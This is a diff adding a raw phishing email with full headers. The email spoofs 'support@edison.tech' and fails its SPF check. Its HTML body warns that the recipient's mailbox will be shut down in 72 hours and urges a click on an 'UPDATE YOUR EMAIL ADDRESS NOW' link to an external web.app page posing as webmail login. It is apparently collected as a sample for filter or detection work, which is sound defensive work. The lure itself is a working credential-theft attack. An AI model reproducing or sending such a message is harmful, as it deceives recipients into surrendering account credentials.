@@ -1,0 +1,78 @@
+Delivered-To: mailsupport@edison.tech
+Received: by 2002:aca:31d3:0:0:0:0:0 with SMTP id x202csp2877486oix;
+        Mon, 20 Jul 2020 16:19:46 -0700 (PDT)
+X-Google-Smtp-Source: ABdhPJyq+md+cMFuIQZEW7BbFOJEId7pz85Hj847n5E+FQc3L78sV7aByHdoGOSbsk6bBdDrXisP
+X-Received: by 2002:a1c:61d7:: with SMTP id v206mr1267660wmb.173.1595287186002;
+        Mon, 20 Jul 2020 16:19:46 -0700 (PDT)
+ARC-Seal: i=1; a=rsa-sha256; t=1595287185; cv=none;
+        d=google.com; s=arc-20160816;
+        b=lKcWfYEFgs3xmzOTFloXoPe6w6L9Fk0OMNkuubpyAKKzRL2G61TdQujWD78d/o+nYD
+         XNq/JtzRE+5joYzZGNstEiwSkLwmaYJ6ol2t53WQPULGjps+jffyLL+yZVPHuRv9Oktr
+         v+CLsXOEhC6KjR2NnpeEirUFcYLye1FcNsMjrxkCdX+4KykoX9ugi9w1iFWXxpKT0Go4
+         XcVjIjQpcZ8Fd3cCkO/dzmRh2BeW716dLEwQP4AYlAaUoqGUTGa+Onf1qYjE2JfP6PLk
+         +MlL4BGjFwP7tpuBpOWs5v+DvZN08WruTBEtORcA/hyTItxFkB93pmYe++uCPuIuawrU
+         KEWw==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20160816;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:to
+         :from;
+        bh=tYI6TBYdHsRWO07NNamOZb8EKn+omsbAAJv9wjefFEM=;
+        b=NHdQRsnE1CeuI9b/DMt3ugDGXWH8YgIVVyne+Hk+6X/qT402wCMmiQmohd8Z/rTVBO
+         RiT1Fj1D0/P2vT7khKPz6Y8WrGjmMW+y2rZs+Iyran+hCjkjpJdYQmLWKW/mr2bkk/6y
+         p7GNuUVTrhc/WpyCO5eBrMEwgghKmdyTP5n29ysFdTnlD4PiC2oIlXYWkYxPLrTWxJJ4
+         pe/wIK451YbIAaObXldtDM6CggPWP3HT5RaZD9YFiU3q0MDSIBsTR5260GKsmg5DrOOf
+         jcfw7rx7gSNPqs81knmTxQjzL/Ugb9kLqlhDb5edTNcNaHvSk3HXQ3LbwXo0WN9mN91M
+         Ceig==
+ARC-Authentication-Results: i=1; mx.google.com;
+       spf=temperror (google.com: error in processing during lookup of support@edison.tech: DNS error) smtp.mailfrom=support@edison.tech
+Return-Path: <support@edison.tech>
+Received: from edison.tech ([160.20.147.128])
+        by mx.google.com with ESMTP id a68si675860wme.131.2020.07.20.16.19.45
+        for <mailsupport@edison.tech>;
+        Mon, 20 Jul 2020 16:19:45 -0700 (PDT)
+Received-SPF: temperror (google.com: error in processing during lookup of support@edison.tech: DNS error) client-ip=160.20.147.128;
+Authentication-Results: mx.google.com;
+       spf=temperror (google.com: error in processing during lookup of support@edison.tech: DNS error) smtp.mailfrom=support@edison.tech
+From: support@edison.tech
+To: mailsupport@edison.tech
+Subject:  Update your Email mailsupport@edison.tech  now to stay active
+Date: 20 Jul 2020 16:19:40 -0700
+Message-ID: <20200720161936.22E0D49F9F748543@edison.tech>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD><TITLE></TITLE>
+<META http-equiv=3DX-UA-Compatible cont Dear <strong>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body>mailsupport</STRONG>=20
+<DIV></DIV>
+<DIV>&nbsp;</DIV>
+<DIV>&nbsp;</DIV>
+<DIV>Your mailbox will be shutdown in 72 hours if not updated on the server=
+ for security reasons</DIV>
+<DIV>&nbsp;</DIV>
+<DIV>&nbsp;</DIV>
+<DIV>&nbsp;</DIV>
+<DIV>
+<DIV>Click "update" to stop account shutdown now!&nbsp;</DIV>
+<DIV>&nbsp;</DIV>
+<DIV>&nbsp;</DIV>
+<DIV>&nbsp;</DIV>
+<DIV><A href=3D"https://roundcubes.web.app#mailsupport@edison.tech">UPDATE =
+YOUR EMAIL ADDRESS NOW</A></DIV>
+<DIV>&nbsp;</DIV>
+<DIV>&nbsp;</DIV>
+<DIV>&nbsp;</DIV>
+<DIV>Please do note this update is required for your E-mail mailsupport@edi=
+son.tech to stay active</DIV>
+<DIV>&nbsp;</DIV>
+<DIV>&nbsp;</DIV>
+<DIV>&nbsp;</DIV></DIV>
+<DIV>Thank you!</DIV>
+<DIV>&nbsp;</DIV>
+<DIV><STRONG>System Administrator</STRONG></DIV>
+<DIV>&nbsp;</DIV>
+<DIV><SPAN style=3D"FONT-SIZE: 9px; FONT-FAMILY: verdana; COLOR: rgb(63,65,=
+67); TEXT-ALIGN: center; BACKGROUND-COLOR: rgb(255,255,255)">Copyright&copy=
+;&nbsp;2020 Webmail, Inc.</SPAN></DIV></BODY></HTML>
